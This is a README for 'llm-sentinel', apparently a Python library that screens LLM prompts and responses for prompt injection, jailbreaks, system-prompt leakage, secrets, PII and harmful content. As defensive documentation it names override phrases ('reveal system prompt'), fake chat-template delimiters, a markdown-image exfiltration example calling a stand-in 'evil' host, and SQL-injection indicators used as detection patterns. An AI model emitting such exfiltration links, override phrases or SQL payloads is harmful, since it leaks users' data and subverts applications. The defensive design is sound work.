# llm-sentinel

[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![transformers](https://img.shields.io/badge/transformers-%E2%89%A54.40-orange.svg)](https://github.com/huggingface/transformers)

**llm-sentinel** is a defense-in-depth input and output guard for LLM applications — stopping prompt injection, jailbreaks, PII exposure, and harmful model responses before they reach your users.

---

## Table of Contents

- [What is llm-sentinel?](#what-is-llm-sentinel)
- [Key Features](#key-features)
- [System Architecture](#system-architecture)
- [Quick Start](#quick-start)
  - [Prerequisites](#prerequisites)
  - [Installation](#installation)
  - [Configuration](#configuration)
  - [Run your first check](#run-your-first-check)
- [SDK Reference](#sdk-reference)
  - [Guard](#guard)
  - [check\_input](#guardcheck_input)
  - [check\_output](#guardcheck_output)
  - [Exceptions](#exceptions)
- [Input Pipeline](#input-pipeline)
- [Output Pipeline](#output-pipeline)
- [Identity and Roles](#identity-and-roles)
- [REST API (optional)](#rest-api-optional)
- [Configuration Reference](#configuration-reference)
- [Test](#test)
- [Project Layout](#project-layout)
- [Audit Log](#audit-log)
- [Performance](#performance)
- [Roadmap](#roadmap)

---

## What is llm-sentinel?

Prompt injection, jailbreaks, secret leakage, PII exposure, and harmful model responses are constant threats for any product built on an LLM. llm-sentinel sits between your code and your model — it runs every incoming prompt and outgoing response through layered pipelines of cheap deterministic checks followed by ML-based classification and configurable per-application policy enforcement.

It ships as both an **in-process Python SDK** (`from sentinel import Guard`) and an optional **REST sidecar** for non-Python stacks. Models load lazily on the first call and are cached for the lifetime of the `Guard` instance. The design is fail-safe throughout: an unavailable classifier returns `review`, never `allow`.

---

## Key Features

### Defense-in-depth pipeline
Every prompt passes normalization → rule checks → Prompt Guard 2 classifier → per-application policy, in that order. Each stage short-circuits on `block`, so expensive ML stages only run when cheap deterministic ones pass. The same layered model applies in reverse to model responses.

### Fail-safe by design
An unavailable classifier or PII detector never silently passes through. It returns `review`, flagging the request for human oversight rather than allowing potentially dangerous content.

### Per-application policies
Applications declare allowed capabilities, blocked topics, and PII handling in YAML files — no code changes required. Per-role overrides let privileged users access additional capabilities. The same policy file governs both input and output checks.

### In-process SDK and optional REST sidecar
`Guard` works directly in any Python application with no server or network hop. For Node.js, Go, Ruby, or any other stack, the same functionality is available as a FastAPI sidecar over HTTP.

### SHA-256 hash-only audit log
Every check writes a JSON audit line to stdout. Content is never logged — only the SHA-256 hash. Pipe stdout to your log aggregator to retain audit trails without storing sensitive user input.

### Offline after first pull
All models run locally via `transformers`. After the initial download they are cached with `local_files_only=True` — no outbound calls during inference.

---

## System Architecture

```
your code
  │
  ├─▶ guard.check_input(prompt)
  │       │
  │       ├─ 1. Normalization       (NFC, zero-width strips, HTML decode, whitespace)
  │       ├─ 2. Rule checks         (injection phrases, fake delimiters, secrets, blobs)
  │       ├─ 3. Classifier          (Prompt Guard 2, 86M — local, chunked scoring)
  │       └─ 4. Policy              (capabilities, topics, PII per application)
  │                │
  │                ▼ verdict: allow | review | block
  │                  result.sanitized_prompt
  │
  ├─▶ [your LLM call]
  │
  └─▶ guard.check_output(response, prompt=prompt)
          │
          ├─ 1. Normalization       (same canonicalization as input)
          ├─ 2. Rule checks         (system-prompt leakage, secrets in responses)
          ├─ 3. Policy              (topics, PII redaction per application)
          └─ 4. Safety classifier   (Llama Guard 3-1B — safe/unsafe + hazard categories)
                   │
                   ▼ verdict: allow | review | block
                     out.sanitized_output
```

| Goal | How it's achieved |
|------|-------------------|
| Stop prompt injection before it reaches the model | Rule engine + Prompt Guard 2 classifier |
| Catch jailbreaks that evade simple pattern matching | ML classifier with overlapping-chunk scoring for long prompts |
| Prevent secret leakage in prompts and responses | Regex rule packs covering major key formats |
| Detect harmful content in model responses | Llama Guard 3-1B content-safety classifier (14 hazard categories) |
| Catch system-prompt disclosure in responses | Output rule pack (leakage patterns) |
| Redact PII in prompts and responses | Dual-model PII detector (piiranha + bert-base-NER) |
| Let applications define their own capability and topic policies | Per-application YAML policy files |
| Never log sensitive content | SHA-256 hash-only audit log to stdout |
| Work offline after first model pull | `local_files_only=True` on all model loads |
| Fast unit tests (< 1s) | Classifier and PII disable flags; no ML loaded in CI |

---

## Quick Start

### Prerequisites

- **Python 3.10+**
- For ML inference: a machine with ~3 GB free disk space for model weights
- Gated Hugging Face models require `huggingface-cli login` (or use the ungated mirrors listed under [Installation](#installation))

### Installation

```bash
# Rules + normalization only (no ML models — policy-only or CI use)
pip install -e "."

# With local ML inference (all classifiers + PII detector)
pip install -e ".[ml]"
```

**Gated models on Hugging Face:**

- `meta-llama/Llama-Prompt-Guard-2-86M` — request access and run `huggingface-cli login`, or set `SENTINEL_CLASSIFIER_MODEL=gravitee-io/Llama-Prompt-Guard-2-86M-onnx` (ungated mirror)
- `meta-llama/Llama-Guard-3-1B` — request access similarly, or point `SENTINEL_SAFETY_MODEL` at an ungated mirror

Models are downloaded on first run (~350 MB for Prompt Guard 2, ~2 GB for Llama Guard 3-1B) and cached locally.

### Configuration

All settings are read from environment variables (or a `.env` file) with the `SENTINEL_` prefix. No config file is required for a default setup. See the full [Configuration Reference](#configuration-reference) for all options.

```bash
# Optional: restrict access to the REST sidecar
export SENTINEL_API_KEY=your-secret-key

# Optional: use ungated model mirrors
export SENTINEL_CLASSIFIER_MODEL=gravitee-io/Llama-Prompt-Guard-2-86M-onnx
```

Policy files live in a `policies/` directory by default. Each file is named after the `application_id` it governs. See [`policies/support-bot.yaml`](policies/support-bot.yaml) for a full example.

### Run your first check

```python
from sentinel import Guard

guard = Guard.from_policy("policies")          # directory of per-app policy YAML files

# Check the user's prompt before it reaches the model
result = guard.check_input(prompt, user_id="u123", application_id="support-bot")
if result.verdict == "block":
    return "I can't help with that."

# Pass result.sanitized_prompt to your LLM, then vet the response
llm_response = my_llm(result.sanitized_prompt)
out = guard.check_output(llm_response, prompt=prompt, application_id="support-bot")
if out.verdict != "block":
    return out.sanitized_output
```

No server required. Models load lazily on the first call.

---

## SDK Reference

### `Guard`

```python
from sentinel import Guard, PromptBlocked, OutputBlocked

# Default — no policy, runs normalization + rules + classifier only
guard = Guard()

# Scoped to a policy directory
guard = Guard.from_policy("policies/")

# Custom IAM (see Identity and roles below)
guard = Guard(policy_dir="policies/", identity_provider=MyOktaProvider())

# Eagerly load all models at startup instead of on first call
guard.load()
```

### `guard.check_input`

```python
result = guard.check_input(
    prompt,
    application_id="support-bot",   # enables policy evaluation
    user_id="u123",                  # resolved to roles via identity provider
    capabilities=["web_search"],     # capabilities the user is requesting
    threshold_medium=0.50,           # classifier score → review (default from env)
    threshold_high=0.90,             # classifier score → block (default from env)
    raise_on_block=False,            # raise PromptBlocked instead of returning
)

result.verdict          # "allow" | "review" | "block"
result.sanitized_prompt # normalized + PII-redacted text (None when blocked)
result.blocked_at       # "rule_checks" | "classifier" | "policy" | None
result.risk_score       # classifier score (None when not applicable)
result.pipeline         # full per-stage detail
```

### `guard.check_output`

```python
out = guard.check_output(
    llm_response,
    prompt=original_prompt,          # improves Llama Guard accuracy
    application_id="support-bot",
    system_prompt=SYSTEM_PROMPT,     # optional: block responses that leak it (LLM07)
    canaries=[canary],               # optional: block responses containing a canary
    raise_on_block=False,
)

out.verdict           # "allow" | "review" | "block"
out.sanitized_output  # normalized + PII-redacted text (None when blocked)
out.blocked_at        # "rule_checks" | "leakage" | "output_handling" | "policy" | "safety" | None
out.safety_categories # hazard categories that caused a block, e.g. ["violent_crimes"]
out.pipeline          # full per-stage detail
```

#### System-prompt leakage (OWASP LLM07)

Two optional, deterministic checks. Neither the prompt nor the canary is ever logged or returned.

```python
# 1. Canary: plant a random marker in the system prompt. It has no legitimate
#    reason to appear in a response, so any appearance means extraction.
system_prompt, canary = Guard.with_canary("You are SupportBot. ...")
reply = my_llm(system_prompt, user_prompt)
out = guard.check_output(reply, canaries=[canary])   # blocked_at == "leakage"

# 2. Semantic similarity with the real system prompt (see below) — on by
#    default when system_prompt is given.
out = guard.check_output(reply, system_prompt=system_prompt)
out = guard.check_output(reply, system_prompt=system_prompt, semantic_leak=False)  # off for this call
```

**Semantic similarity (optional).** When `system_prompt` is supplied and no canary fired, the prompt and response are split into sentences, embedded with a sentence-embedding model, and compared by cosine similarity. A response sentence at or above `SENTINEL_SEMANTIC_LEAK_THRESHOLD` (default `0.80`) blocks with `system_prompt_semantic` — this catches verbatim dumps, paraphrases and, with the default multilingual model, translations. **Not detected:** re-encoding (base64, ROT13, one character per line) of the prompt, unless a canary survives it — use as one layer. `system_prompt` is used only by this check, so with it turned off only canaries protect you.

- **Turn it off:** globally with `SENTINEL_DISABLE_SEMANTIC_LEAK=true`, or per call with `semantic_leak=False` (REST: `"semantic_leak": false`). `semantic_leak=True` forces it on when globally disabled.
- **Lazy:** the model loads on the first call that supplies a system prompt, never at startup, and never when no system prompt is passed. It needs the `ml` extra (`pip install .[ml]`); the first use downloads about 470 MB.
- **Fail-safe:** if it is enabled but the model can't load (or the text exceeds `SENTINEL_SEMANTIC_LEAK_MAX_SEGMENTS`), the verdict is `review`, not `allow`. Turn it off if you'd rather skip silently.
- **Tuning:** a reply that legitimately mentions a rule ("I can't help with refunds that large") can score near the rule. Raise the threshold if you see false positives, and watch `pipeline.leakage.semantic_similarity` (returned even when it passes) to choose a value.
- **Privacy:** only sentence embeddings, keyed by a hash of the prompt, are cached in memory; the prompt text is not retained.

### Exceptions

```python
from sentinel import PromptBlocked, OutputBlocked

try:
    result = guard.check_input(prompt, raise_on_block=True)
except PromptBlocked as e:
    e.blocked_at   # stage that blocked it
    e.violations   # rule violation ids, if applicable
    e.result       # the full AnalyzeResponse

try:
    out = guard.check_output(response, raise_on_block=True)
except OutputBlocked as e:
    e.blocked_at         # stage that blocked it
    e.safety_categories  # Llama Guard hazard codes, if applicable
    e.result             # the full OutputAnalyzeResponse
```

---

## Input Pipeline

### Stage 1 — Normalization

Canonicalizes the text so later stages see a consistent representation regardless of encoding tricks:

- Unicode NFC normalization
- Strip invisible/zero-width/bidi-override characters (U+200B–U+202E, U+FEFF, etc.)
- Single-pass HTML entity decode (one round only, so `&amp;lt;` doesn't become `<`)
- Collapse excessive whitespace/newline runs
- Trim leading/trailing whitespace

`sanitized_prompt` in the result is always the normalized (and potentially PII-redacted) version, never the raw input.

### Stage 2 — Rule checks

A YAML rule pack (`app/rules/default.yaml`) defines regex pattern categories:

| Category | Examples |
|----------|----------|
| `injection_patterns` | role override phrases, "reveal system prompt", jailbreak markers |
| `delimiter_patterns` | fake `[SYSTEM]` / `<\|im_start\|>` tokens, chat template injections |
| `secret_patterns` | OpenAI/Anthropic keys, AWS access keys, GitHub tokens, PEM blocks |

A base64/hex ratio heuristic catches obfuscated payloads: if more than 40% of the prompt is base64-like blobs (≥ 40 chars each), it's flagged.

Any match produces a `block` with a `violations` list. Add patterns under any category — no code changes required.

### Stage 3 — Classifier

[Meta Llama Prompt Guard 2 (86M)](https://huggingface.co/meta-llama/Llama-Prompt-Guard-2-86M) runs locally via `transformers`. The model's context window is 512 tokens; prompts longer than that are scored in overlapping 128-token-stride chunks so an attacker can't hide a payload past the truncation boundary.

The malicious label ID is resolved from `model.config.label2id` at startup — the classifier fails safe if the model has no recognizable label rather than silently scoring everything benign.

**Verdicts from score thresholds:**

| Score | Verdict |
|-------|---------|
| `< medium` (default 0.50) | `allow` |
| `medium ≤ score < high` (default 0.90) | `review` |
| `≥ high` | `block` |

### Stage 4 — Policy (per application)

The policy stage runs only when `application_id` is supplied. It evaluates three sub-checks in order — policy can only **downgrade** the verdict (`allow` → `review` → `block`), never upgrade it.

**Capabilities** — applications declare which capabilities are allowed or blocked. Users requesting a capability not in the allowed list are blocked. Per-role overrides let privileged users access additional capabilities.

```yaml
# policies/my-app.yaml
capabilities:
  allowed: [web_search, kb_lookup]
  blocked: [code_execution, file_write]
roles:
  admin:
    capabilities:
      allowed: [web_search, kb_lookup, code_execution]
```

**Topic blocking** — keyword lists gate topics at the application level.

```yaml
topics:
  blocked:
    - id: medical_advice
      keywords: [diagnosis, prescription, dosage]
```

**PII detection and redaction** — two models run in tandem:

| Model | Strength |
|-------|----------|
| [`iiiorg/piiranha-v1-detect-personal-information`](https://huggingface.co/iiiorg/piiranha-v1-detect-personal-information) | Structured PII: emails, phones, SSNs, credit cards, addresses, IDs |
| [`dslim/bert-base-NER`](https://huggingface.co/dslim/bert-base-NER) | Person names and locations in prose (PER + LOC groups only) |

Spans from both models are merged, de-overlapped, and snapped to word boundaries. The policy action is configured per application:

```yaml
pii:
  action: redact      # block | redact | flag
  entities: [EMAIL, PHONE, SSN, CREDIT_CARD, PERSON, ADDRESS]
```

`redact` replaces entities with stable placeholders (`[EMAIL_1]`, `[PERSON_1]`, …) — the same value maps to the same placeholder within one prompt, so the LLM can still refer to redacted values coherently.

---

## Output Pipeline

### Threat model

| Threat | Caught by |
|--------|-----------|
| Exfiltration images/links, `<script>` / event-handler HTML, `javascript:` URLs in a response | Output handling stage (parser-verified; per-app `output:` policy) |
| Model discloses its system prompt / hidden instructions | Output rule pack (`leak_patterns`); optional canary + semantic system-prompt check (`leakage`) |
| Credentials or API keys in a response | Output rule pack (`secret_patterns`) |
| Raw chat-template tokens leaking into output | Output rule pack (`leak_patterns`) |
| Harmful content (violence, CSAM, weapons, self-harm, …) | Llama Guard 3-1B (14 hazard categories) |
| Blocked topics appearing in responses | Per-application policy (topics) |
| PII exposure to end users | Per-application policy (PII detect → block/redact/flag) |

### Stage 2 — Output rule checks

`app/rules/output.yaml` defines two categories:

| Category | Patterns |
|----------|----------|
| `leak_patterns` | `system_prompt_disclosure`, `instruction_recital`, `chat_template_tokens` |
| `secret_patterns` | Same key formats as the input pack |

### Stage 2b — Leakage check (optional)

Runs after rule checks when the caller supplies `system_prompt` and/or `canaries` (SDK arguments, or fields on `POST /v1/output/analyze`). Blocks with `blocked_at: "leakage"` and violations `canary_leaked` or `system_prompt_semantic`. See [System-prompt leakage](#system-prompt-leakage-owasp-llm07).

### Stage 2c — Output handling (OWASP LLM05)

A model response is untrusted input to whatever consumes it next. This stage neutralizes the constructs that turn a response into an attack, according to the application's policy. It runs by default (turn it off with `SENTINEL_DISABLE_OUTPUT_HANDLING=true`) and later stages judge the neutralized text.

| Threat | Default | Modes |
|--------|---------|-------|
| Markdown images — `![x](https://evil/?d=SECRET)` is fetched by the renderer on its own: a silent exfiltration channel | `strip` | `allow` · `allowlist` · `strip` · `block` |
| Markdown links, autolinks, bare URLs — phishing, exfiltration | `allow` | `allow` · `allowlist` · `strip` · `block` |
| Raw HTML — `<script>`, event handlers, `<iframe>` | `sanitize` | `allow` · `sanitize` · `block` |
| `javascript:` / `data:` / `vbscript:` URLs | always stripped | — |
| SQL-injection indicators (stacked or destructive statements, `OR 1=1`, `UNION SELECT`, …) | `allow` (opt-in) | `allow` · `flag` · `block` · `readonly` |

```yaml
# policies/support-bot.yaml
output:
  images: strip            # or allowlist, with allowed_domains
  links: allowlist
  allowed_domains: [docs.acme.com]   # subdomains match too
  html: sanitize           # coding assistants: html: allow
  sql: readonly            # text-to-SQL apps: single read-only query only
```

Global defaults come from `SENTINEL_OUTPUT_IMAGES`, `SENTINEL_OUTPUT_LINKS`, `SENTINEL_OUTPUT_HTML` and `SENTINEL_OUTPUT_ALLOWED_DOMAINS`; a policy file's `output:` section overrides them per application. `strip` keeps the link text or image alt text and removes the URL. A response that is changed still gets verdict `allow` with the cleaned text in `sanitized_output`; `block` mode returns `blocked_at: "output_handling"`. Report: `pipeline.output_handling` (`findings`, `actions`).

How it works: markdown is *detected* with a CommonMark parser ([markdown-it-py](https://github.com/executablebooks/markdown-it-py)) plus a raw-syntax pass (parsers silently drop `javascript:` links that other renderers might not), *rewritten* conservatively, then **re-parsed to verify** — if anything disallowed survives, the response is blocked (fail closed). HTML is sanitized by [nh3](https://github.com/messense/nh3), never by hand. Relative URLs count as same-origin in `allowlist` mode.

**Limits.** This reduces risk; it does not replace encoding at the sink (parameterized queries, HTML escaping, no `shell=True`). Fenced and inline code is left alone for markdown images/links, but is **not** exempt from HTML scanning — set `html: allow` for apps that emit code. With `html: allow`, `images`/`links` apply to markdown only, not raw `<img>`/`<a>`. When HTML is present, the text is re-serialized by the sanitizer, which escapes stray `&`, `<`, `>`. Shell-injection patterns are not detected (yet).

**SQL.** Opt-in, because ordinary answers contain SQL. For apps that execute or interpolate model output into a query (text-to-SQL, database agents), set `sql` to `flag` (verdict `review`), `block`, or `readonly` (block, and also refuse any `INSERT`/`UPDATE`/`DELETE`/DDL). Statements are split with [sqlparse](https://github.com/andialbrecht/sqlparse) — a `;` inside a string or comment isn't a boundary — and classified by shape, so prose like "Update the settings" isn't SQL. Indicators (reported in `pipeline.output_handling.sql_indicators`): `sql_stacked_statements`, `sql_destructive` (DROP/TRUNCATE/ALTER/CREATE/GRANT/REVOKE), `sql_unbounded_write` (UPDATE/DELETE without WHERE), `sql_write_statement` (`readonly` only), `sql_tautology`, `sql_union_select`, `sql_comment_truncation`, `sql_time_delay`, `sql_file_or_exec`. SQL is detected, never rewritten. Statements are recognized at the start of a line, code fence or inline code span (a `DROP TABLE` buried mid-sentence is not), and a prose line like "Delete from the menu what you dislike." can false-positive. It is heuristic, not a SQL validator, and explanatory answers with SQL examples will trip it — use it only on apps whose output reaches a database, and keep parameterized queries and a read-only DB role as the real defense.

### Stage 3 — Policy (output)

The same per-application YAML drives both directions. For outputs, only **topics** and **PII** apply — capability checks are a request-time concern. PII redaction lands in `sanitized_output`.

Policy runs **before** the safety classifier so Llama Guard judges the sanitized text (what would actually be shown to the user). When a policy declares PII handling, S7 (privacy) is excluded from Llama Guard enforcement for that request — Llama Guard otherwise flags even redacted `[EMAIL_1]`-style placeholders.

### Stage 4 — Llama Guard 3 safety classifier

[Llama Guard 3-1B](https://huggingface.co/meta-llama/Llama-Guard-3-1B) generates a content-safety verdict on the sanitized output. Unlike Prompt Guard (an encoder that emits a probability), Llama Guard is a causal LM that generates `safe` or `unsafe\nS1,S9`. There are no thresholds — the verdict is binary.

**MLCommons hazard taxonomy (S1–S14):**

| Code | Category |
|------|----------|
| S1 | violent_crimes |
| S2 | non_violent_crimes |
| S3 | sex_related_crimes |
| S4 | child_sexual_exploitation |
| S5 | defamation |
| S6 | specialized_advice |
| S7 | privacy |
| S8 | intellectual_property |
| S9 | indiscriminate_weapons |
| S10 | hate |
| S11 | suicide_and_self_harm |
| S12 | sexual_content |
| S13 | elections |
| S14 | code_interpreter_abuse |

Passing the original `prompt` alongside the `output` is optional but recommended — Llama Guard judges responses in context, and the same answer can be safe or unsafe depending on the question asked.

`SENTINEL_SAFETY_EXCLUDED_CATEGORIES` (e.g. `S6,S13`) excludes specific categories from enforcement. Exclusion filters the verdict, not the prompt — if everything the model flagged is excluded the result is `safe` with a note; if anything else was also flagged the block stands.

---

## Identity and Roles

llm-sentinel does **not** manage users. It resolves a `user_id` into roles via the `IdentityProvider` protocol — you supply an implementation backed by your IAM:

```python
from app.identity import Identity, IdentityProvider
from sentinel import Guard

class OktaIdentityProvider:
    def resolve(self, user_id: str) -> Identity:
        profile = my_okta_client.get_user(user_id)
        return Identity(user_id=user_id, roles=profile.roles)

guard = Guard(policy_dir="policies/", identity_provider=OktaIdentityProvider())
```

The shipped `StaticIdentityProvider` reads an optional `identities.yaml` and falls back to `["default"]` for unknown users. It exists so the pipeline works out of the box — replace it for production.

---

## REST API (optional)

For non-Python stacks (Node.js, Go, Ruby), llm-sentinel also runs as a sidecar HTTP service:

```bash
pip install -e ".[ml]"
uvicorn app.main:app --port 8000
```

### `POST /v1/input/analyze`

```json
{
  "prompt": "string (1–8192 chars, required)",
  "context": {
    "application_id": "string | null",
    "user_id": "string | null",
    "session_id": "string | null",
    "capabilities": ["string"]
  },
  "options": {
    "thresholds": { "medium": 0.50, "high": 0.90 }
  }
}
```

Returns `{ "verdict": "allow|review|block", "sanitized_prompt": "...", "blocked_at": "...", "risk_score": 0.94, "pipeline": {...}, "meta": {...} }`.

### `POST /v1/output/analyze`

```json
{
  "output": "model response to vet (required, 1–16384 chars)",
  "prompt": "the user prompt it answered (optional)",
  "context": { "application_id": "string | null", "user_id": "string | null" }
}
```

Returns `{ "verdict": "allow|review|block", "sanitized_output": "...", "safety_categories": [...], "pipeline": {...}, "meta": {...} }`.

### `GET /healthz`

```json
{ "status": "ok", "classifier_loaded": true, "safety_loaded": true }
```

---

## Configuration Reference

All values can be set in `.env` (prefix `SENTINEL_`) or as environment variables. CLI flags (for the REST sidecar) always override environment variables, which override defaults.

### Authentication

| Variable | Default | Effect |
|----------|---------|--------|
| `SENTINEL_API_KEY` | *(unset)* | When set, all REST requests (except `/healthz`) must include `Authorization: Bearer <value>`. When unset, the server logs a startup warning and accepts unauthenticated calls — only deploy that way behind mTLS or a trusted network boundary. |

### Input pipeline

| Variable | Default | Effect |
|----------|---------|--------|
| `SENTINEL_MAX_PROMPT_LENGTH` | `8192` | Maximum prompt length in characters |
| `SENTINEL_MAX_REQUEST_BYTES` | `1048576` | Max REST body size; larger → `413`, missing `Content-Length` → `411` |
| `SENTINEL_RATE_LIMIT_REQUESTS` | `0` (off) | Max calls per window per caller (key: `user_id`, else `application_id`, else client IP). Exceeded → REST `429` + `Retry-After`; SDK raises `RateLimitExceeded`. Per-process counters. |
| `SENTINEL_RATE_LIMIT_WINDOW_SECONDS` | `60` | Rate-limit window |
| `SENTINEL_RATE_LIMIT_MAX_KEYS` | `10000` | Max tracked callers; when full of live keys, new callers are rejected (fail closed) |
| `SENTINEL_CLASSIFIER_MAX_CHUNKS` | `8` | Max 512-token chunks scored per prompt; longer prompts skip the classifier and return `review` |
| `SENTINEL_CONTROL_CHARS_PATTERN` | `\x00-\x08…` | Control chars that reject the request |
| `SENTINEL_RULES_FILE` | `default.yaml` | Input rule pack filename (resolved inside `app/rules/` package directory) |
| `SENTINEL_CLASSIFIER_MODEL` | `meta-llama/Llama-Prompt-Guard-2-86M` | Classifier model id or local path |
| `SENTINEL_CLASSIFIER_DEVICE` | `auto` | Device: `auto` (cuda→mps→cpu) or explicit |
| `SENTINEL_DISABLE_CLASSIFIER` | `false` | Skip the classifier stage entirely |
| `SENTINEL_CLASSIFIER_THRESHOLD_MEDIUM` | `0.50` | Score at which verdict becomes `review` |
| `SENTINEL_CLASSIFIER_THRESHOLD_HIGH` | `0.90` | Score at which verdict becomes `block` |

### Policy

| Variable | Default | Effect |
|----------|---------|--------|
| `SENTINEL_POLICIES_DIR` | `policies` | Directory of per-application policy YAML files |
| `SENTINEL_PII_MODEL` | `iiiorg/piiranha-v1-detect-personal-information` | Structured PII model |
| `SENTINEL_PII_NER_MODEL` | `dslim/bert-base-NER` | Secondary NER model for names/locations |
| `SENTINEL_DISABLE_PII` | `false` | Skip PII detection entirely |
| `SENTINEL_IDENTITIES_FILE` | `identities.yaml` | Static identity file (placeholder IAM) |

### Output pipeline

| Variable | Default | Effect |
|----------|---------|--------|
| `SENTINEL_MAX_OUTPUT_LENGTH` | `16384` | Maximum output length in characters |
| `SENTINEL_OUTPUT_RULES_FILE` | `output.yaml` | Output rule pack filename (resolved inside `app/rules/` package directory) |
| `SENTINEL_DISABLE_SEMANTIC_LEAK` | `false` | Turn off the embedding-similarity leak check (overridable per call with `semantic_leak`) |
| `SENTINEL_SEMANTIC_LEAK_MODEL` | `sentence-transformers/paraphrase-multilingual-MiniLM-L12-v2` | Sentence-embedding model id or local path |
| `SENTINEL_SEMANTIC_LEAK_THRESHOLD` | `0.80` | Cosine similarity at which a response sentence counts as restating the prompt |
| `SENTINEL_SEMANTIC_LEAK_MIN_WORDS` | `4` | Sentences shorter than this are ignored |
| `SENTINEL_SEMANTIC_LEAK_MAX_SEGMENTS` | `256` | Max sentences per side; beyond this the stage skips and the verdict is `review` |
| `SENTINEL_SEMANTIC_LEAK_DEVICE` | `auto` | Device: `auto` (cuda→mps→cpu) or explicit |
| `SENTINEL_MAX_SYSTEM_PROMPT_LENGTH` | `32768` | Max `system_prompt` characters accepted for leak checks |
| `SENTINEL_MAX_CANARIES` | `16` | Max canaries per call |
| `SENTINEL_DISABLE_OUTPUT_HANDLING` | `false` | Skip the output-handling stage (LLM05) entirely |
| `SENTINEL_OUTPUT_IMAGES` | `strip` | Default for markdown images: `allow` · `allowlist` · `strip` · `block` |
| `SENTINEL_OUTPUT_LINKS` | `allow` | Default for links/URLs: `allow` · `allowlist` · `strip` · `block` |
| `SENTINEL_OUTPUT_HTML` | `sanitize` | Default for raw HTML: `allow` · `sanitize` · `block` |
| `SENTINEL_OUTPUT_SQL` | `allow` | Default for SQL-injection indicators: `allow` · `flag` · `block` · `readonly` |
| `SENTINEL_OUTPUT_ALLOWED_DOMAINS` | *(empty)* | Comma-separated hosts for `allowlist` mode (subdomains match) |
| `SENTINEL_SAFETY_MODEL` | `meta-llama/Llama-Guard-3-1B` | Llama Guard model id or local path |
| `SENTINEL_SAFETY_DEVICE` | `auto` | Device: `auto` (cuda→mps→cpu) or explicit |
| `SENTINEL_DISABLE_SAFETY` | `false` | Skip the safety classifier entirely |
| `SENTINEL_SAFETY_MAX_NEW_TOKENS` | `20` | Max tokens to generate for the verdict |
| `SENTINEL_SAFETY_EXCLUDED_CATEGORIES` | `` | Comma-separated hazard codes to suppress, e.g. `S6,S13` |

---

## Test

```bash
# Unit + integration tests — runs in < 1s, no ML models loaded
pytest

# End-to-end against a running server
cd e2e && ./run_all.sh
```

The test suite sets `SENTINEL_DISABLE_CLASSIFIER=true`, `SENTINEL_DISABLE_PII=true`, and `SENTINEL_DISABLE_SAFETY=true` (in `tests/conftest.py`) so it never loads transformer models — CI stays fast.

---

## Project Layout

```
llm-sentinel/
├── sentinel/
│   ├── __init__.py          # exports: Guard, PromptBlocked, OutputBlocked
│   └── guard.py             # Guard class — in-process SDK entry point
├── app/
│   ├── main.py              # FastAPI app (optional REST sidecar)
│   ├── config.py            # All settings via pydantic-settings + .env
│   ├── audit.py             # JSON-line audit log to stdout (hash-only)
│   ├── identity.py          # IdentityProvider protocol + StaticIdentityProvider
│   ├── api/v1/
│   │   ├── input.py         # POST /v1/input/analyze
│   │   └── output.py        # POST /v1/output/analyze
│   ├── models/
│   │   ├── request.py       # Request schemas
│   │   └── response.py      # AnalyzeResponse, OutputAnalyzeResponse, stage models
│   ├── pipeline/
│   │   ├── normalization.py # Stage 1 — text canonicalization
│   │   ├── rules.py         # Stage 2 — YAML rule engine (input + output packs)
│   │   ├── classifier.py    # Input stage 3 — Prompt Guard 2 classifier
│   │   ├── safety.py        # Output stage 4 — Llama Guard 3 safety classifier
│   │   ├── pii.py           # PII detection + redact()
│   │   └── policy.py        # Stage 4/3 — capabilities / topics / PII policy
│   └── rules/
│       ├── default.yaml     # Input pack: injection, delimiter, secret patterns
│       └── output.yaml      # Output pack: leakage + secret patterns
├── policies/
│   └── support-bot.yaml     # Example application policy
├── tests/
│   ├── conftest.py          # Disables ML for fast test runs
│   ├── test_sdk.py          # SDK (Guard) tests
│   ├── test_pipeline.py     # Normalization + rule engine unit tests
│   ├── test_api.py          # Input REST API integration tests
│   ├── test_output_api.py   # Output REST API integration tests
│   └── test_policy.py       # Policy engine + redact + identity tests
├── e2e/                     # curl scripts (00–21) for manual end-to-end testing
├── identities.example.yaml  # Template for static user→role mapping
└── pyproject.toml
```

---

## Audit Log

Every `check_input` / `check_output` call writes a JSON line to stdout:

```json
{"ts": "2024-01-01T00:00:00Z", "request_id": "…", "stage": "classifier",
 "verdict": "block", "prompt_hash": "sha256:…", "application_id": "my-app",
 "risk_score": 0.97}
```

Output pipeline stages use `output_hash` instead of `prompt_hash`, and stage names `output_rule_checks`, `safety`, `output_policy`.

Content is **never logged** — only the SHA-256 hash. Pipe stdout to your log aggregator to retain audit trails without storing sensitive user input.

---

## Performance

| Stage | Typical latency |
|-------|----------------|
| Rule checks | < 1 ms |
| Prompt Guard 2 (86M, MPS) | ~5 ms |
| PII detection (piiranha + bert-base-NER, MPS) | ~50–100 ms |
| Llama Guard 3-1B (MPS) | ~100–300 ms |

Llama Guard generates output tokens (causal LM) rather than doing a single forward pass, which is why it's slower than Prompt Guard despite similar hardware. For high-throughput deployments, disable the safety classifier (`SENTINEL_DISABLE_SAFETY=true`) or enforce it only on responses above a token-count threshold.

---

## Roadmap

- **FastAPI middleware** — `app.add_middleware(SentinelMiddleware, guard=guard)` for automatic per-route enforcement
- **Decorator** — `@guard.protect` for selective per-endpoint coverage
- **MCP server** — expose `check_input`, `check_output`, `explain_violation` as MCP tools for Claude Code
- **OpenAI-compatible proxy** — drop-in `base_url` override that wraps any LLM backend
- **Semantic topic classification** — replace keyword blocking with an embedding-based classifier (v2)
- **Async mode** — non-blocking classifiers for high-throughput deployments
- **OpenTelemetry** — structured spans per pipeline stage

---

## License

MIT
